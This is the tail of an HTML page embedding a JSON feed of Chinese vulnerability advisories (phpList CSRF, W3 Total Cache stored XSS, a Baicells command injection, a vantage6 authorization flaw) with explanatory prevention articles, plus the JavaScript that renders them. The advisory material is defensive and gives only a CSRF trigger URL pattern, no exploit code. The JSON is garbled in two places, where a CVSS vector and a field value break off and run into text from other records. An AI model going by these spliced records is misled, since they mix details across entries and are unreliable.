"exploitability": "中", "fix_suggestion": "建议修复", "kind": "OS命令注入", "kind_en": "操作系统命令中使用的特殊元素的不正确中和（“操作系统命令注入”）", "last_modified_time": "2026-08-14", "level": "High", "mps_id": "MPS-5m7c-bphe", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-5m7c-bphe", "name": "https://www.oscs1024.com/hd/MPS-5m7c-bphe"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-19771", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-19771"}, {"url": "https://github.com/actuator/cve/blob/main/Baicells/EG3661M.md", "name": ""}, {"url": "https://vuldb.com/cve/CVE-2026-19771", "name": ""}, {"url": "https://vuldb.com/submit/869362", "name": ""}, {"url": "https://vuldb.com/vuln/389685", "name": ""}, {"url": "https://vuldb.com/vuln/389685/cti", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-19771漏洞", "_translated": true, "_saved_at": "2026-08-14T04:01:42+00:00", "_first_saved_at": "2026-08-14T04:01:42+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-5m7c-bphe"}, {"analysis_status": 0, "articles": [{"content": "跨站点请求伪造 (CSRF)通过利用网站对用户请求的信任进行攻击。当用户在网站A登录并在同一浏览器会话中访问网站B时，攻击者可以构造特制的请求并诱使用户执行，以使网站B误以为这些请求是用户合法发起的。\n攻击者通常通过欺骗用户点击恶意链接、在受信任的网站中植入恶意代码或通过钓鱼等手段来实施CSRF攻击，一旦用户执行了恶意请求，攻击者可以以用户的身份执行任意操作，包括更改用户密码、发起资金转账或删除重要数据等。", "title": "什么是CSRF"}, {"content": "- 链接欺骗：攻击者通过向用户发送包含恶意链接的电子邮件或社交媒体消息，诱使用户点击并执行恶意请求。\n- 图片引用攻击：攻击者通过在恶意网站上包含指向目标网站的图片引用，以触发用户浏览器自动发送目标网站的请求。\n- XSS利用：如果目标网站存在XSS漏洞，攻击者可以注入恶意脚本，以使用户在浏览器中执行恶意请求。", "title": "CSRF常见的攻击方式"}, {"content": "- 随机令牌：网站可以在每个请求中包含一个随机生成的令牌（CSRF Token），并验证该令牌的有效性，以确认请求的来源是合法的。\n- SameSite Cookie：使用SameSite属性来限制跨站点请求，将Cookie的发送限制在同一站点上，减少了跨站请求伪造的风险。\n- 双重验证：对于敏感操作，网站可以要求用户进行额外的验证，例如输入验证码、提供第二个因素的身份验证等。\n- 强化浏览器策略：网站可以设置Content-Security-Policy（CSP）头，限制浏览器执行恶意脚本的能力，减少CSRF攻击的风险。\n- 限制用户操作：网站可以要求用户在执行敏感操作之前进行明确的确认或授权，防止恶意请求被误触发。\n- 安全编码实践：开发人员应遵循安全编码实践，对用户输入进行适当的验证和过滤，防止恶意请求的注入。", "title": "如何预防CSRF"}], "cnvd_id": "", "cve_id": "CVE-2026-73482", "cvss": {"cvssv31": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:N/I:H/A:H", "severity": "high", "base_score": 8.1}], "cvssv4": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "high", "base_score": 7.2}]}, "cvss_score": 7.2, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:N/VI:H/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-352", "description": "3.7.0-RC5之前的phpList在lists/admin/admins.php中包含跨站点请求伪造（CSRF）漏洞。管理员删除操作是通过未经身份验证的 GET 请求 (?page=admins\u0026delete=N) 触发的，该请求不受 CSRF 令牌保护（中央 verifyCsrfGetToken 检查使用 enforce=false，并且当令牌参数不存在时会被绕过）。远程攻击者可以诱骗登录的超级管理员加载精心设计的 URL（例如，作为图像嵌入电子邮件中）以删除任何非自身管理员帐户。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "CSRF", "kind_en": "跨站请求伪造 (CSRF)", "last_modified_time": "2026-08-14", "level": "High", "mps_id": "MPS-7xcj-fqh6", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://www.oscs1024.com/hd/MPS-7xcj-fqh6", "name": "https://www.oscs1024.com/hd/MPS-7xcj-fqh6"}, {"url": "https://nvd.nist.gov/vuln/detail/CVE-2026-73482", "name": "https://nvd.nist.gov/vuln/detail/CVE-2026-73482"}, {"url": "https://github.com/phpList/phplist3/commit/5159c3ed33a5674a8169472b50d146d97f630746", "name": ""}, {"url": "https://github.com/phpList/phplist3/issues/1117", "name": ""}, {"url": "https://github.com/phpList/phplist3/pull/1121", "name": ""}, {"url": "https://github.com/phpList/phplist3/releases/tag/v3.7.0-RC5", "name": ""}, {"url": "https://www.vulncheck.com/advisories/phplist-rc5-cross-site-request-forgery-via-admins-php", "name": ""}], "scope_influence": "", "tags": [], "title": "CVE-2026-73482漏洞", "_translated": true, "_saved_at": "2026-08-13T20:36:02+00:00", "_first_saved_at": "2026-08-13T20:36:02+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-7xcj-fqh6"}, {"analysis_status": 0, "articles": [{"content": "跨界内存读是指应用程序在读取内存时，未正确验证或限制读取的内存范围。攻击者利用这种漏洞可以读取应用程序内存中的敏感数据，如密码、加密密钥、会话令牌等。常见的原因是由于缓冲区溢出、格式化字符串漏洞或其他内存错误导致的。", "title": "什么是越界读取"}, {"content": "攻击者可以通过不当构造的输入来触发跨界内存读漏洞。攻击者可能会通过向应用程序发送特定的输入，使其读取超过预期的内存区域。攻击者可以利用这个漏洞来获取敏感信息，如其他用户的数据、操作系统的敏感数据或应用程序的内部状态。", "title": "越界读取常见的攻击方式"}, {"content": "- 输入验证和限制：应用程序应对所有输入数据进行严格的验证和限制。确保输入数据的长度、格式和内容符合预期，避免超出缓冲区或访问非预期的内存区域。\n- 内存安全编程实践：开发人员应使用安全的编程实践，如避免使用不安全的函数、正确处理内存分配和释放操作，以及遵循最小特权原则。\n- 使用安全的编程语言和库：选择使用安全性较高的编程语言和库，这些语言和库在内存管理和安全性方面提供了更多的保护机制。\n- 定期进行代码审查和安全测试：定期审查应用程序的代码，并进行安全测试，以发现潜在的跨界内存读漏洞。使用静态代码分析工具和漏洞扫描工具来辅助检测和修复问题。\n- 实施防御性编程技术：应用程序应采用防御性编程技术，如使用随机化地址空间布局（ASLR）、堆栈保护机制（如堆栈溢出保护）和数据执行预防（DEP）等。\n- 及时更新和修补：及时应用程序和操作系统的安全更新和补丁，以确保已知的跨界内存读漏洞得到修复。及时更新相关软件和库，以避免使用已知存在漏洞的版本。", "title": "如何预防越界读取"}], "cnvd_id": "", "cve_id": "CVE-2026-73515", "cvss": {"cvssv31": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:H", "severity": "high", "base_score": 8.1}], "cvssv4": [{"source": "disclosure@vulncheck.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:H/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI: ； 因此，转义字符以防止这种操作是保护代码免受此漏洞影响的首要方法。\r\n- 转义意味着应用程序被编码以标记关键字符，特别是用户输入中包含的关键字符，以防止这些字符在危险的上下文中被解释。 例如，在 HTML 中，\u003c 可以编码为 \u0026lt; 并且\u003e可以被编码为\u0026gt; 为了在文本中被解释和显示为它们自己，而在代码本身中，它们被用于 HTML 标记。 如果将恶意内容注入到转义特殊字符的应用程序中，并且该恶意内容使用 \u003c 和 \u003e 作为 HTML 标记，那么如果这些字符在应用程序代码中正确转义，那么这些字符将不会被浏览器解释为 HTML 标记。 转移未遂攻击的方式。\r\n- XSS 最突出的用途是窃取 cookie（来源：OWASP HttpOnly）和劫持用户会话，但 XSS 漏洞已被用于暴露敏感信息、允许访问特权服务和功能以及传播恶意软件。", "title": "什么是XSS"}, {"content": "| 类型        | 描述                                                         |\r\n| ----------- | ------------------------------------------------------------ |\r\n| 存储型      | 攻击者将恶意代码插入到应用程序中（通常作为链接）。 每次用户单击链接时，代码都会被激活。 |\r\n| 反射型      | 攻击者从易受攻击的网站应用程序外部向用户提供恶意链接。 单击时，恶意代码将发送到易受攻击的网站，将攻击反映回用户的浏览器。 |\r\n| 基于 DOM 的 | 攻击者强制用户的浏览器呈现恶意页面。 页面中的数据本身提供跨站点脚本数据。 |\r\n| 变异        | 攻击者注入看似安全的代码，但随后在解析标记时被浏览器重写和修改。 一个例子是重新平衡未闭合的引号，甚至为未引用的参数添加引号。 |", "title": "XSS常见的攻击方式"}, {"content": "- 在将 HTTP 请求中的数据输入反射回来之前对其进行清理，确保在将任何数据回显给用户之前验证、过滤或转义所有数据，例如搜索期间的查询参数值。\r\n- 将特殊字符（如 ?、\u0026、/、\u003c、\u003e 和空格）转换为其各自的 HTML 或 URL 编码等价物。\r\n- 为用户提供禁用客户端脚本的选项。\r\n- 重定向无效请求。\r\n- 检测同时登录，包括来自两个不同 IP 地址的登录，并使这些会话无效。\r\n- 使用并执行内容安全策略（Content Safe Policy）来禁用可能被 XSS 攻击操纵的任何功能。\r\n- 阅读代码中引用的所有库的文档，了解哪些元素允许嵌入 HTML。", "title": "如何预防XSS"}], "cnvd_id": "", "cve_id": "CVE-2026-18109", "cvss": {"cvssv31": [{"source": "security@wordfence.com", "vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N", "severity": "high", "base_score": 7.2}]}, "cvss_score": 7.2, "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N", "cwe": "CWE-79", "description": "由于输入清理和输出转义不足，WordPress 的 W3 Total Cache 插件在 2.10.3 及之前的所有版本中都容易受到通过评论作者姓名进行存储的跨站点脚本攻击。这使得未经身份验证的攻击者可以在页面中注入任意 Web 脚本，每当用户访问注入的页面时就会执行这些脚本。仅当启用 W3 Total Cache 的延迟加载图像功能时，此漏洞才可被利用，因为不安全的重新发射仅发生在 LazyLoad 变异器的 img 标记重写步骤中。", "effects": [], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "低", "exploitability": "中", "fix_suggestion": "可选修复", "kind": "XSS", "kind_en": "网页生成期间输入的不正确中和（“跨站点脚本”）", "l 绕过应用程序的访问控制机制，获取系统管理员权限，从而完全控制系统。\n- 数据泄露攻击：攻击者可以通过利用此缺陷，获取系统中敏感数据，如用户凭证、信用卡信息等。\n- 拒绝服务攻击：攻击者可以通过利用此缺陷，对系统进行拒绝服务攻击，从而使系统无法正常工作。\n- 恶意软件传播：攻击者可以通过利用此缺陷，将恶意软件传播到系统中，从而控制系统或窃取敏感数据。\n", "title": "授权检查错误常见的攻击方式"}, {"content": "- 使用访问控制列表 (ACL):使用 ACL 可以限制用户对程序中的不同资源的访问权限。ACL 通常由用户名、权限和资源地址组成，可以确保只有授权用户才能访问程序中的重要数据或资源。\n- 使用访问令牌：使用访问令牌可以确保只有授权用户才能访问程序中的不同资源。令牌通常由用户 ID、权限和资源地址组成，可以确保只有授权用户才能更改令牌的权限。\n- 使用安全审计：在程序中记录安全审计日志，可以确保管理员可以追踪未授权用户的活动。同时，定期审查安全审计日志，可以及时发现未授权的活动并采取相应的措施。\n- 最小特权原则：程序应该限制用户输入的数据的权限，只允许授权用户进行特定的操作，以减少未授权用户对受保护资源或数据的访问。\n- 输入验证：程序应该对用户输入的数据进行适当的验证和过滤，以确保输入的数据符合预期的格式和类型。\n- 安全编码实践：程序应该遵循一些安全编码实践，如使用安全的算法和加密机制、避免使用未认证的库和框架、避免使用默认设置等，以减少漏洞的出现。\n", "title": "如何预防授权检查错误"}], "attack_vector_type": "Network", "cnvd_id": "", "cve_id": "CVE-2026-73652", "cvss": {"cvssv4": [{"source": "security-advisories@github.com", "vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "severity": "high", "base_score": 7.1}]}, "cvss_score": 7.1, "cvss_vector": "CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:N/VI:H/VA:N/SC:N/SI:N/SA:N/E:X/CR:X/IR:X/AR:X/MAV:X/MAC:X/MAT:X/MPR:X/MUI:X/MVC:X/MVI:X/MVA:X/MSC:X/MSI:X/MSA:X/S:X/AU:X/R:X/V:X/RE:X/U:X", "cwe": "CWE-863", "description": "### 影响\n编辑权限缺乏所有权检查，因此其他开发人员可以更改稍后受节点信任的元数据。 \n\n他们能做的最糟糕的事情就是更新图像或图像标签。如果未注明，则会批准另一张图像，而不是实际正在审核的图像\n\n### 补丁\n否\n\n### 解决方法\n否", "effects": [{"comp_name": "vantage6", "ecosystem": "pip", "versions": [{"affected_version": "(-∞,5.0.2]", "min_fixed_version": "", "repository": "pip", "solutions": [], "upstream": true}]}, {"comp_name": "vantage6-algorithm-store", "ecosystem": "pip", "versions": [{"affected_version": "(-∞,5.0.2]", "min_fixed_version": "", "repository": "pip", "solutions": [], "upstream": true}]}], "epss": -1, "exp": false, "exploit_requirement": "", "exploit_requirement_cost": "中", "exploitability": "中", "fix_suggestion": "建议修复", "kind": "授权检查错误", "kind_en": "授权错误", "last_modified_time": "2026-08-14", "level": "High", "mps_id": "MPS-vja6-14ce", "poc": false, "poc_url": [], "published_time": "2026-08-14", "reference_url_list": [{"url": "https://github.com/vantage6/vantage6/security/advisories/GHSA-47w6-gwp4-w6vc", "name": ""}, {"url": "https://github.com/advisories/GHSA-47w6-gwp4-w6vc", "name": ""}], "scope_influence": "", "tags": ["python", "开源"], "title": "vantage6：算法开发人员可以编辑其他开发人员正在等待/正在审核的算法", "_translated": true, "_saved_at": "2026-08-13T20:36:00+00:00", "_first_saved_at": "2026-08-13T20:36:00+00:00", "_source_page": "https://www.oscs1024.com/hd/MPS-vja6-14ce"}]}</script>
  <script>
    const payload = JSON.parse(document.getElementById("payload").textContent);
    const levelLabels = payload.level_labels || {};
    const items = payload.items || [];
    let filtered = items.slice();
    let activeId = null;

    const $ = (id) => document.getElementById(id);
    $("generatedAt").textContent = payload.generated_at || "-";
    $("retention").textContent = payload.retention_days ?? "-";
    $("cutoff").textContent = payload.cutoff_date || "-";
    $("count").textContent = String(payload.count ?? items.length);

    function levelClass(level) {
      const cn = levelLabels[level] || level || "";
      if (level === "Critical" || cn === "严重") return "crit";
      if (level === "High" || cn === "高危") return "high";
      return "other";
    }
    function levelText(level) {
      return levelLabels[level] || level || "-";
    }
    function esc(s) {
      return String(s ?? "")
        .replaceAll("&", "&amp;")
        .replaceAll("<", "&lt;")
        .replaceAll(">", "&gt;")
        .replaceAll('"', "&quot;");
    }
    function scoreText(v) {
      if (v === null || v === undefined || v === "" || v === -1) return "-";
      return String(v);
    }

    function renderList() {
      const list = $("list");
      $("listCount").textContent = String(filtered.length);
      if (!filtered.length) {
        list.innerHTML = '<div class="empty">没有匹配项</div>';
        return;
      }
      list.innerHTML = filtered.map((it) => {
        const id = it.mps_id || it.cve_id;
        const active = id === activeId ? " active" : "";
        return `
          <button class="item${active}" data-id="${esc(id)}" type="button">
            <div class="item-top">
              <span class="cve">${esc(it.cve_id || it.mps_id || "-")}</span>
              <span class="badge ${levelClass(it.level)}">${esc(levelText(it.level))}</span>
            </div>
            <div class="title">${esc(it.title || "-")}</div>
            <div class="item-foot">
              <span>CVSS ${esc(scoreText(it.cvss_score))}</span>
              <span>${esc(it.published_time || "-")}</span>
              ${it.poc ? "<span>POC</span>" : ""}
            </div>
          </button>`;
      }).join("");
      list.querySelectorAll(".item").forEach((btn) => {
        btn.addEventListener("click", () => selectById(btn.dataset.id));
      });
    }

    function refsHtml(it) {
      const refs = Array.isArray(it.reference_url_list) ? it.reference_url_list : [];
      const links = [];
      if (it._source_page) links.push({ url: it._source_page, name: "OSCS 详情" });
      if (it.cve_id) links.push({ url: `https://nvd.nist.gov/vuln/detail/${it.cve_id}`, name: "NVD" });
      refs.forEach((r) => {
        if (r && r.url) links.push({ url: r.url, name: r.name || r.url });
      });
      const seen = new Set();
      const uniq = [];
      for (const l of links) {
        if (seen.has(l.url)) continue;
        seen.add(l.url);
        uniq.push(l);
      }
      if (!uniq.length) return '<div class="box">无参考链接</div>';
      return `<div class="refs">${uniq.map((l) =>
        `<a href="${esc(l.url)}" target="_blank" rel="noopener">${esc(l.name || l.url)}</a>`
      ).join("")}</div>`;
    }

    function articlesHtml(it) {
      const arts = Array.isArray(it.articles) ? it.articles : [];
      if (!arts.length) return "";
      return `<div class="section"><h3>相关说明</h3>${arts.map((a) => `
        <div class="article">
          <h4>${esc(a.title || "说明")}</h4>
          <p>${esc(a.content || "")}</p>
        </div>`).join("")}</div>`;
    }

    function renderDetail(it) {
      const detail = $("detail");
      if (!it) {
        detail.innerHTML = '<div class="empty">暂无数据</div>';
        return;
      }
      const pocUrls = Array.isArray(it.poc_url) ? it.poc_url : [];
      detail.innerHTML = `
        <div class="d-head">
          <div>
            <h1 class="d-title">${esc(it.title || "-")}</h1>
            <div class="ids">
              <span class="badge ${levelClass(it.level)}">${esc(levelText(it.level))}</span>
              <span class="chip">${esc(it.cve_id || "无 CVE")}</span>
              <span class="chip">${esc(it.mps_id || "-")}</span>
              ${it.poc ? '<span class="chip">有 POC</span>' : ""}
              ${it.exp ? '<span class="chip">有 EXP</span>' : ""}
            </div>
          </div>
          <div class="actions">
            ${it._source_page ? `<a class="btn" href="${esc(it._source_page)}" target="_blank" rel="noopener">OSCS</a>` : ""}
            ${it.cve_id ? `<a class="btn" href="https://nvd.nist.gov/vuln/detail/${esc(it.cve_id)}" target="_blank" rel="noopener">NVD</a>` : ""}
          </div>
        </div>
        <div class="grid">
          <div class="stat"><div class="k">CVSS</div><div class="v">${esc(scoreText(it.cvss_score))}</div></div>
          <div class="stat"><div class="k">向量</div><div class="v">${esc(it.cvss_vector || "-")}</div></div>
          <div class="stat"><div class="k">CWE</div><div class="v">${esc(it.cwe || "-")}</div></div>
          <div class="stat"><div class="k">类型</div><div class="v">${esc(it.kind || it.kind_en || "-")}</div></div>
          <div class="stat"><div class="k">公开</div><div class="v">${esc(it.published_time || "-")}</div></div>
          <div class="stat"><div class="k">利用成本</div><div class="v">${esc(it.exploit_requirement_cost || "-")}</div></div>
          <div class="stat"><div class="k">可利用性</div><div class="v">${esc(it.exploitability || "-")}</div></div>
          <div class="stat"><div class="k">修复建议</div><div class="v">${esc(it.fix_suggestion || "-")}</div></div>
        </div>
        <div class="section"><h3>描述</h3><div class="box">${esc(it.description || "无描述")}</div></div>
        ${it.scope_influence ? `<div class="section"><h3>影响范围</h3><div class="box">${esc(it.scope_influence)}</div></div>` : ""}
        ${pocUrls.length ? `<div class="section"><h3>POC 链接</h3><div class="refs">${pocUrls.map((u) => `<a href="${esc(u)}" target="_blank" rel="noopener">${esc(u)}</a>`).join("")}</div></div>` : ""}
        <div class="section"><h3>参考链接</h3>${refsHtml(it)}</div>
        ${articlesHtml(it)}
      `;
    }

    function selectById(id) {
      const it = filtered.find((x) => (x.mps_id || x.cve_id) === id) ||
                 items.find((x) => (x.mps_id || x.cve_id) === id);
      if (!it) return;
      activeId = it.mps_id || it.cve_id;
      renderList();
      renderDetail(it);
      const btn = document.querySelector(`.item[data-id="${CSS.escape(activeId)}"]`);
      if (btn) btn.scrollIntoView({ block: "nearest" });
      history.replaceState(null, "", "#" + encodeURIComponent(activeId));
    }

    function applyFilter(q) {
      const query = (q || "").trim().toLowerCase();
      filtered = !query ? items.slice() : items.filter((it) => {
        const blob = [
          it.cve_id, it.mps_id, it.title, it.kind, it.kind_en, it.cwe, it.description, it.level
        ].map((x) => String(x || "").toLowerCase()).join(" ");
        return blob.includes(query);
      });
      renderList();
      if (filtered.length) {
        const still = filtered.some((x) => (x.mps_id || x.cve_id) === activeId);
        selectById(still ? activeId : (filtered[0].mps_id || filtered[0].cve_id));
      } else {
        activeId = null;
        renderDetail(null);
      }
    }

    $("search").addEventListener("input", (e) => applyFilter(e.target.value));

    document.addEventListener("keydown", (e) => {
      if (e.key === "/" && document.activeElement !== $("search")) {
        e.preventDefault();
        $("search").focus();
        return;
      }
      if (!filtered.length) return;
      const idx = filtered.findIndex((x) => (x.mps_id || x.cve_id) === activeId);
      if (e.key === "ArrowDown") {
        e.preventDefault();
        const next = filtered[Math.min(filtered.length - 1, Math.max(0, idx) + 1)];
        selectById(next.mps_id || next.cve_id);
      } else if (e.key === "ArrowUp") {
        e.preventDefault();
        const prev = filtered[Math.max(0, idx - 1)];
        selectById(prev.mps_id || prev.cve_id);
      }
    });

    const hashId = decodeURIComponent((location.hash || "").replace(/^#/, ""));
    if (hashId && items.some((x) => (x.mps_id || x.cve_id) === hashId)) {
      activeId = hashId;
      renderList();
      selectById(hashId);
    } else if (items.length) {
      selectById(items[0].mps_id || items[0].cve_id);
    } else {
      renderList();
      renderDetail(null);
    }
  </script>
</body>
</html>
